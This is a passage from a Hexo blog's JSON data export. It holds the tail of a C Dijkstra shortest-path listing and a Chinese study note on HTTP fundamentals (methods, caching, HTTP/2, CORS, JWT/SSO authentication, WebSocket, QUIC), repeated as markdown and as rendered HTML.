class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">#参考代码<span class=\"hljs-number\">2</span>：<br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;conio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> X 10000</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> VertexNum  7  <span class=\"hljs-comment\">//实际上共有六个顶点（1---6）</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> EdgeNum  9</span><br><br><span class=\"hljs-type\">int</span> Graph[VertexNum][VertexNum] =<br><span class=\"hljs-comment\">//0  1  2  3  4  5  6</span><br>&#123; X, X, X, X, X, X, X,  <span class=\"hljs-comment\">//0</span><br>  X, X, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">3</span>, X, X, X,  <span class=\"hljs-comment\">//1</span><br>  X, X, X, X, <span class=\"hljs-number\">5</span>, X, X,  <span class=\"hljs-comment\">//2</span><br>  X, X, <span class=\"hljs-number\">2</span>, X, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, X,  <span class=\"hljs-comment\">//3</span><br>  X, X, X, X, X, X, <span class=\"hljs-number\">3</span>,  <span class=\"hljs-comment\">//4</span><br>  X, X, X, X, <span class=\"hljs-number\">2</span>, X, <span class=\"hljs-number\">5</span>,  <span class=\"hljs-comment\">//5</span><br>  X, X, X, X, X, X, X   <span class=\"hljs-comment\">//6</span><br>&#125;;<br><br><span class=\"hljs-type\">int</span> Visited[VertexNum];<br><span class=\"hljs-type\">int</span> path[VertexNum];<br><span class=\"hljs-type\">int</span> Distance[VertexNum];<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Dijkstra</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> Begin)</span><br>&#123;<br>  <span class=\"hljs-type\">int</span> MinEdge, Vertex, i,j, Edges;<br>  Edges = <span class=\"hljs-number\">1</span>;<br>  Visited[Begin] = <span class=\"hljs-number\">1</span>;<br>  <span class=\"hljs-keyword\">for</span> (i = <span class=\"hljs-number\">1</span>; i&lt;VertexNum; i++) Distance[i] = Graph[Begin][i];<br><br>  Distance[Begin] = <span class=\"hljs-number\">0</span>;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;     1  2  3  4  5  6\\\\n&quot;</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;-----------------------------------\\\\n&quot;</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;s:%d&quot;</span>, Edges);<br>  <span class=\"hljs-keyword\">for</span>( i=<span class=\"hljs-number\">1</span>; i&lt;VertexNum; i++)<br>  <span class=\"hljs-keyword\">if</span> (Distance[i] == X) <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;  *&quot;</span>); <span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,Distance[i]);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n&quot;</span>);<br>  <span class=\"hljs-keyword\">while</span>( Edges&lt;VertexNum<span class=\"hljs-number\">-1</span>)<br>  &#123;<br>    Edges++; MinEdge = X;<br>    <span class=\"hljs-keyword\">for</span>(j=<span class=\"hljs-number\">1</span>; j&lt;VertexNum; j++)<br>    <span class=\"hljs-keyword\">if</span> (Visited[j]==<span class=\"hljs-number\">0</span> &amp;&amp; MinEdge &gt; Distance[j] )<br>    &#123;<br> Vertex = j; MinEdge = Distance[j];<br>    &#125;<br>    Visited[Vertex] = <span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;s:%d&quot;</span>,Edges);<br>    <span class=\"hljs-keyword\">for</span>(j=<span class=\"hljs-number\">1</span>; j&lt;VertexNum; j++)<br>    &#123;<br>      <span class=\"hljs-keyword\">if</span> (Visited[j] == <span class=\"hljs-number\">0</span> &amp;&amp; Distance[Vertex] + Graph[Vertex][j] &lt;Distance[j])<br>      &#123;   Distance[j] = Distance[Vertex] + Graph[Vertex][j];<br>   path[j] = Vertex;<br>      &#125;<br>      <span class=\"hljs-comment\">//printf(&quot;%6d&quot;,Distance[j]);</span><br>       <span class=\"hljs-keyword\">if</span> (Distance[j] == X) <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;  *&quot;</span>); <span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,Distance[j]);<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <br>  <span class=\"hljs-type\">int</span> i;<br>  <span class=\"hljs-type\">int</span> k;<br> <span class=\"hljs-comment\">// clrscr();</span><br>  <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>; i&lt;VertexNum; i++) &#123; Visited[i] = <span class=\"hljs-number\">0</span>;  path[i] = <span class=\"hljs-number\">1</span>;&#125;<br>  Dijkstra(<span class=\"hljs-number\">1</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n\\\\nAll Path-------------------------\\\\n&quot;</span>);<br><br><br>  <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">2</span>; i&lt;VertexNum; i++) <span class=\"hljs-comment\">//printf(&quot;%5d&quot;,Visited[i]);</span><br>  &#123;<br>     <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[%d] &quot;</span>,Distance[i]);<br>     k = i;<br>     <span class=\"hljs-keyword\">do</span><br>     &#123;<br>       <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d&lt;--&quot;</span>,k);<br>       k  = path[k];<br>     &#125; <span class=\"hljs-keyword\">while</span> (k!=<span class=\"hljs-number\">1</span>);<br>     <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;1 \\\\n&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n"},{"title":"HTTPS实用指南","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg6.jpeg","_content":"\n\n# HTTPS实用指南\n\n## 一、初识\n\n### 1.背景知识\n\n输入网址获得网页的过程？\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/f6ce5b862569e192.jpg)\n\n##### HTTP发展\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/bd303c5375ece729.jpg)\n\n### 2.报文内容\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/eb7f13f8f1a5596c.jpg)\n\n```\n常用请求头\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/1848c837bc2cf08d.jpg)\n\n```\n常用响应头\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/08fd49af7f73a5af.jpg)\n\n### 3. Methods\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/83884b861c15d41f.jpg)\n\n- 安全的（不会修改服务器数据）：GET HEAD OPTIONS\n- 幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；\n\n### 4.状态码\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/86f6032a7181310d.jpg)\n\n### 5. Restful API\n\n- 每一种URL代表一种资源；\n- 客户端和服务器之间，传递这种资源的某种表现层；\n- 客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/377079155bbec1bc.jpg)\n\n### 6.缓存\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/65a645bc76884d65.jpg)\n\n- 强缓存资源本地有就直接用本地资源\n- 协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；\n\n```\n缓存流程示意\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/1bd6b0f0379d4254.jpg)\n\n### 7. Cookie\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/f2c87718dc00674c.jpg)\n\n### 8. HTTP/2\n\n> 更快、更稳定、更简单\n\n- 使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；\n- 采用二进制编码，效率更高，有更好的压缩算法；\n- 消息：与逻辑请求或者响应消息对应的完整的一系列帧；\n- 数据流：已建立的连接内双向字节流，可以承载一条或多条消息；\n- 交错发送，接收方重组织；\n- 链接都是永久的，而且仅需要每个来源一个连接；\n- 流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/e85b4b47fe56a57a.jpg)\n\n### 9.  HTTPS\n\n```\n经过TSL/SSL加密\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/d6e3190e2ebe64b2.jpg)\n\n## 二、HTTP协议的应用场景分析\n\n### 1.静态资源\n\n```\n方案：缓存+CDN+文件名Hash\n```\n\n- CDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；\n- 文件名Hash来保证每次刷新获得的资源是最新的；\n\n### 2.登录\n\n头条页面密码登录会发出两个请求；\n\n- 请求1的Methods是OPTIONS：跨域、cross-origin\n\n```\n一个url由scheme+host name+port组成\ne.g. https://www.example.com:443\n跨域：scheme、host name、prot任意一个有区别都认为是跨域；\nNote：如果https没有写明443端口号也可以认为是同域；http默认80；port可以不写；\n```\n\n- 跨域\n\n![](https://pic.imgdb.cn/item/63dc762107d5ca72062d5196.jpg)\n\n##### 跨域解决方案：\n\n- CORS\n- 代理服务器：同源策略是浏览器的安全策略，不是http的\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/2ed3f548ffca14ab.jpg)\n\n- IFrame：存在诸多不便；\n\n![](https://pic.imgdb.cn/item/63dc76b007d5ca72062e430c.jpg)\n\n##### 鉴权\n\n- session+cookie\n- JWT（JSON web token）token具有唯一性；\n\n![](https://pic.imgdb.cn/item/63dc76fe07d5ca72062e9fdb.jpg)\n\n- SSO（Single Sign On）：单点登录\n\n重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；\n\n## 三、实战\n\n### 1. Ajax之XHR\n\n### 2.常用请求库Axios（参考官网）\n\n### 3.网络优化（需要补充）\n\n![](https://pic.imgdb.cn/item/63dc79d407d5ca7206341e84.jpg)\n\n### 4.稳定性\n\n- 重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；\n- 缓存合理使用，作为最后一道防线；\n\n![](https://pic.imgdb.cn/item/63dc7a1507d5ca7206351481.jpg)\n\n## 四、拓展\n\n### 1.Websocket\n\n- 进行全双工的通讯；\n- 实时性要求较高，例如聊天室；（开启聊天室demo）\n- url使用ws:// 或者 wss：//\n\n### 2.QUIC（Quick UDP Internet Connection）\n\n- 相比于TCP更快；\n- 可靠性类似于TCP；\n- 支持h2的多路复用，没有TCP的HOL文通；\n- 前向纠错FEC\n- 用户空间的阻塞算法，最新的BBR算法；\n\n\n\n\n\n\n\n","source":"_posts/HTTP.md","raw":"---\ntitle:  HTTPS实用指南\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 计算机网络\n    - 笔记\nmp3: \ncover: img/bg6.jpeg\n---\n\n\n# HTTPS实用指南\n\n## 一、初识\n\n### 1.背景知识\n\n输入网址获得网页的过程？\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/f6ce5b862569e192.jpg)\n\n##### HTTP发展\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/bd303c5375ece729.jpg)\n\n### 2.报文内容\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/eb7f13f8f1a5596c.jpg)\n\n```\n常用请求头\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/1848c837bc2cf08d.jpg)\n\n```\n常用响应头\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/08fd49af7f73a5af.jpg)\n\n### 3. Methods\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/83884b861c15d41f.jpg)\n\n- 安全的（不会修改服务器数据）：GET HEAD OPTIONS\n- 幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；\n\n### 4.状态码\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/86f6032a7181310d.jpg)\n\n### 5. Restful API\n\n- 每一种URL代表一种资源；\n- 客户端和服务器之间，传递这种资源的某种表现层；\n- 客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/377079155bbec1bc.jpg)\n\n### 6.缓存\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/65a645bc76884d65.jpg)\n\n- 强缓存资源本地有就直接用本地资源\n- 协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；\n\n```\n缓存流程示意\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/1bd6b0f0379d4254.jpg)\n\n### 7. Cookie\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/f2c87718dc00674c.jpg)\n\n### 8. HTTP/2\n\n> 更快、更稳定、更简单\n\n- 使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；\n- 采用二进制编码，效率更高，有更好的压缩算法；\n- 消息：与逻辑请求或者响应消息对应的完整的一系列帧；\n- 数据流：已建立的连接内双向字节流，可以承载一条或多条消息；\n- 交错发送，接收方重组织；\n- 链接都是永久的，而且仅需要每个来源一个连接；\n- 流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/e85b4b47fe56a57a.jpg)\n\n### 9.  HTTPS\n\n```\n经过TSL/SSL加密\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/d6e3190e2ebe64b2.jpg)\n\n## 二、HTTP协议的应用场景分析\n\n### 1.静态资源\n\n```\n方案：缓存+CDN+文件名Hash\n```\n\n- CDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；\n- 文件名Hash来保证每次刷新获得的资源是最新的；\n\n### 2.登录\n\n头条页面密码登录会发出两个请求；\n\n- 请求1的Methods是OPTIONS：跨域、cross-origin\n\n```\n一个url由scheme+host name+port组成\ne.g. https://www.example.com:443\n跨域：scheme、host name、prot任意一个有区别都认为是跨域；\nNote：如果https没有写明443端口号也可以认为是同域；http默认80；port可以不写；\n```\n\n- 跨域\n\n![](https://pic.imgdb.cn/item/63dc762107d5ca72062d5196.jpg)\n\n##### 跨域解决方案：\n\n- CORS\n- 代理服务器：同源策略是浏览器的安全策略，不是http的\n\n![](https://s3.bmp.ovh/imgs/2023/02/03/2ed3f548ffca14ab.jpg)\n\n- IFrame：存在诸多不便；\n\n![](https://pic.imgdb.cn/item/63dc76b007d5ca72062e430c.jpg)\n\n##### 鉴权\n\n- session+cookie\n- JWT（JSON web token）token具有唯一性；\n\n![](https://pic.imgdb.cn/item/63dc76fe07d5ca72062e9fdb.jpg)\n\n- SSO（Single Sign On）：单点登录\n\n重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；\n\n## 三、实战\n\n### 1. Ajax之XHR\n\n### 2.常用请求库Axios（参考官网）\n\n### 3.网络优化（需要补充）\n\n![](https://pic.imgdb.cn/item/63dc79d407d5ca7206341e84.jpg)\n\n### 4.稳定性\n\n- 重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；\n- 缓存合理使用，作为最后一道防线；\n\n![](https://pic.imgdb.cn/item/63dc7a1507d5ca7206351481.jpg)\n\n## 四、拓展\n\n### 1.Websocket\n\n- 进行全双工的通讯；\n- 实时性要求较高，例如聊天室；（开启聊天室demo）\n- url使用ws:// 或者 wss：//\n\n### 2.QUIC（Quick UDP Internet Connection）\n\n- 相比于TCP更快；\n- 可靠性类似于TCP；\n- 支持h2的多路复用，没有TCP的HOL文通；\n- 前向纠错FEC\n- 用户空间的阻塞算法，最新的BBR算法；\n\n\n\n\n\n\n\n","slug":"HTTP","published":1,"updated":"2023-03-27T11:05:18.316Z","_id":"clg29vyg30012ao9cds212aw6","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"HTTPS实用指南\"><a href=\"#HTTPS实用指南\" class=\"headerlink\" title=\"HTTPS实用指南\"></a>HTTPS实用指南</h1><h2 id=\"一、初识\"><a href=\"#一、初识\" class=\"headerlink\" title=\"一、初识\"></a>一、初识</h2><h3 id=\"1-背景知识\"><a href=\"#1-背景知识\" class=\"headerlink\" title=\"1.背景知识\"></a>1.背景知识</h3><p>输入网址获得网页的过程？</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/f6ce5b862569e192.jpg\"></p>\n<h5 id=\"HTTP发展\"><a href=\"#HTTP发展\" class=\"headerlink\" title=\"HTTP发展\"></a>HTTP发展</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/bd303c5375ece729.jpg\"></p>\n<h3 id=\"2-报文内容\"><a href=\"#2-报文内容\" class=\"headerlink\" title=\"2.报文内容\"></a>2.报文内容</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/eb7f13f8f1a5596c.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">常用请求头<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/1848c837bc2cf08d.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">常用响应头<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/08fd49af7f73a5af.jpg\"></p>\n<h3 id=\"3-Methods\"><a href=\"#3-Methods\" class=\"headerlink\" title=\"3. Methods\"></a>3. Methods</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/83884b861c15d41f.jpg\"></p>\n<ul>\n<li>安全的（不会修改服务器数据）：GET HEAD OPTIONS</li>\n<li>幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；</li>\n</ul>\n<h3 id=\"4-状态码\"><a href=\"#4-状态码\" class=\"headerlink\" title=\"4.状态码\"></a>4.状态码</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/86f6032a7181310d.jpg\"></p>\n<h3 id=\"5-Restful-API\"><a href=\"#5-Restful-API\" class=\"headerlink\" title=\"5. Restful API\"></a>5. Restful API</h3><ul>\n<li>每一种URL代表一种资源；</li>\n<li>客户端和服务器之间，传递这种资源的某种表现层；</li>\n<li>客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/377079155bbec1bc.jpg\"></p>\n<h3 id=\"6-缓存\"><a href=\"#6-缓存\" class=\"headerlink\" title=\"6.缓存\"></a>6.缓存</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/65a645bc76884d65.jpg\"></p>\n<ul>\n<li>强缓存资源本地有就直接用本地资源</li>\n<li>协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">缓存流程示意<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/1bd6b0f0379d4254.jpg\"></p>\n<h3 id=\"7-Cookie\"><a href=\"#7-Cookie\" class=\"headerlink\" title=\"7. Cookie\"></a>7. Cookie</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/f2c87718dc00674c.jpg\"></p>\n<h3 id=\"8-HTTP-2\"><a href=\"#8-HTTP-2\" class=\"headerlink\" title=\"8. HTTP/2\"></a>8. HTTP/2</h3><blockquote>\n<p>更快、更稳定、更简单</p>\n</blockquote>\n<ul>\n<li>使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；</li>\n<li>采用二进制编码，效率更高，有更好的压缩算法；</li>\n<li>消息：与逻辑请求或者响应消息对应的完整的一系列帧；</li>\n<li>数据流：已建立的连接内双向字节流，可以承载一条或多条消息；</li>\n<li>交错发送，接收方重组织；</li>\n<li>链接都是永久的，而且仅需要每个来源一个连接；</li>\n<li>流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/e85b4b47fe56a57a.jpg\"></p>\n<h3 id=\"9-HTTPS\"><a href=\"#9-HTTPS\" class=\"headerlink\" title=\"9.  HTTPS\"></a>9.  HTTPS</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">经过TSL/SSL加密<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/d6e3190e2ebe64b2.jpg\"></p>\n<h2 id=\"二、HTTP协议的应用场景分析\"><a href=\"#二、HTTP协议的应用场景分析\" class=\"headerlink\" title=\"二、HTTP协议的应用场景分析\"></a>二、HTTP协议的应用场景分析</h2><h3 id=\"1-静态资源\"><a href=\"#1-静态资源\" class=\"headerlink\" title=\"1.静态资源\"></a>1.静态资源</h3><figure class=\"highlight arcade\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">方案：缓存+CDN+文件名<span class=\"hljs-built_in\">Hash</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>CDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；</li>\n<li>文件名Hash来保证每次刷新获得的资源是最新的；</li>\n</ul>\n<h3 id=\"2-登录\"><a href=\"#2-登录\" class=\"headerlink\" title=\"2.登录\"></a>2.登录</h3><p>头条页面密码登录会发出两个请求；</p>\n<ul>\n<li>请求1的Methods是OPTIONS：跨域、cross-origin</li>\n</ul>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs delphi\">一个url由scheme+host <span class=\"hljs-keyword\">name</span>+port组成<br>e.g. https:<span class=\"hljs-comment\">//www.example.com:443</span><br>跨域：scheme、host <span class=\"hljs-keyword\">name</span>、prot任意一个有区别都认为是跨域；<br>Note：如果https没有写明<span class=\"hljs-number\">443</span>端口号也可以认为是同域；http默认<span class=\"hljs-number\">80</span>；port可以不写；<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>跨域</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc762107d5ca72062d5196.jpg\"></p>\n<h5 id=\"跨域解决方案：\"><a href=\"#跨域解决方案：\" class=\"headerlink\" title=\"跨域解决方案：\"></a>跨域解决方案：</h5><ul>\n<li>CORS</li>\n<li>代理服务器：同源策略是浏览器的安全策略，不是http的</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/2ed3f548ffca14ab.jpg\"></p>\n<ul>\n<li>IFrame：存在诸多不便；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc76b007d5ca72062e430c.jpg\"></p>\n<h5 id=\"鉴权\"><a href=\"#鉴权\" class=\"headerlink\" title=\"鉴权\"></a>鉴权</h5><ul>\n<li>session+cookie</li>\n<li>JWT（JSON web token）token具有唯一性；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc76fe07d5ca72062e9fdb.jpg\"></p>\n<ul>\n<li>SSO（Single Sign On）：单点登录</li>\n</ul>\n<p>重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；</p>\n<h2 id=\"三、实战\"><a href=\"#三、实战\" class=\"headerlink\" title=\"三、实战\"></a>三、实战</h2><h3 id=\"1-Ajax之XHR\"><a href=\"#1-Ajax之XHR\" class=\"headerlink\" title=\"1. Ajax之XHR\"></a>1. Ajax之XHR</h3><h3 id=\"2-常用请求库Axios（参考官网）\"><a href=\"#2-常用请求库Axios（参考官网）\" class=\"headerlink\" title=\"2.常用请求库Axios（参考官网）\"></a>2.常用请求库Axios（参考官网）</h3><h3 id=\"3-网络优化（需要补充）\"><a href=\"#3-网络优化（需要补充）\" class=\"headerlink\" title=\"3.网络优化（需要补充）\"></a>3.网络优化（需要补充）</h3><p><img src=\"https://pic.imgdb.cn/item/63dc79d407d5ca7206341e84.jpg\"></p>\n<h3 id=\"4-稳定性\"><a href=\"#4-稳定性\" class=\"headerlink\" title=\"4.稳定性\"></a>4.稳定性</h3><ul>\n<li>重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；</li>\n<li>缓存合理使用，作为最后一道防线；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc7a1507d5ca7206351481.jpg\"></p>\n<h2 id=\"四、拓展\"><a href=\"#四、拓展\" class=\"headerlink\" title=\"四、拓展\"></a>四、拓展</h2><h3 id=\"1-Websocket\"><a href=\"#1-Websocket\" class=\"headerlink\" title=\"1.Websocket\"></a>1.Websocket</h3><ul>\n<li>进行全双工的通讯；</li>\n<li>实时性要求较高，例如聊天室；（开启聊天室demo）</li>\n<li>url使用ws:// 或者 wss：//</li>\n</ul>\n<h3 id=\"2-QUIC（Quick-UDP-Internet-Connection）\"><a href=\"#2-QUIC（Quick-UDP-Internet-Connection）\" class=\"headerlink\" title=\"2.QUIC（Quick UDP Internet Connection）\"></a>2.QUIC（Quick UDP Internet Connection）</h3><ul>\n<li>相比于TCP更快；</li>\n<li>可靠性类似于TCP；</li>\n<li>支持h2的多路复用，没有TCP的HOL文通；</li>\n<li>前向纠错FEC</li>\n<li>用户空间的阻塞算法，最新的BBR算法；</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTPS实用指南\"><a href=\"#HTTPS实用指南\" class=\"headerlink\" title=\"HTTPS实用指南\"></a>HTTPS实用指南</h1><h2 id=\"一、初识\"><a href=\"#一、初识\" class=\"headerlink\" title=\"一、初识\"></a>一、初识</h2><h3 id=\"1-背景知识\"><a href=\"#1-背景知识\" class=\"headerlink\" title=\"1.背景知识\"></a>1.背景知识</h3><p>输入网址获得网页的过程？</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/f6ce5b862569e192.jpg\"></p>\n<h5 id=\"HTTP发展\"><a href=\"#HTTP发展\" class=\"headerlink\" title=\"HTTP发展\"></a>HTTP发展</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/bd303c5375ece729.jpg\"></p>\n<h3 id=\"2-报文内容\"><a href=\"#2-报文内容\" class=\"headerlink\" title=\"2.报文内容\"></a>2.报文内容</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/eb7f13f8f1a5596c.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">常用请求头<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/1848c837bc2cf08d.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">常用响应头<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/08fd49af7f73a5af.jpg\"></p>\n<h3 id=\"3-Methods\"><a href=\"#3-Methods\" class=\"headerlink\" title=\"3. Methods\"></a>3. Methods</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/83884b861c15d41f.jpg\"></p>\n<ul>\n<li>安全的（不会修改服务器数据）：GET HEAD OPTIONS</li>\n<li>幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；</li>\n</ul>\n<h3 id=\"4-状态码\"><a href=\"#4-状态码\" class=\"headerlink\" title=\"4.状态码\"></a>4.状态码</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/86f6032a7181310d.jpg\"></p>\n<h3 id=\"5-Restful-API\"><a href=\"#5-Restful-API\" class=\"headerlink\" title=\"5. Restful API\"></a>5. Restful 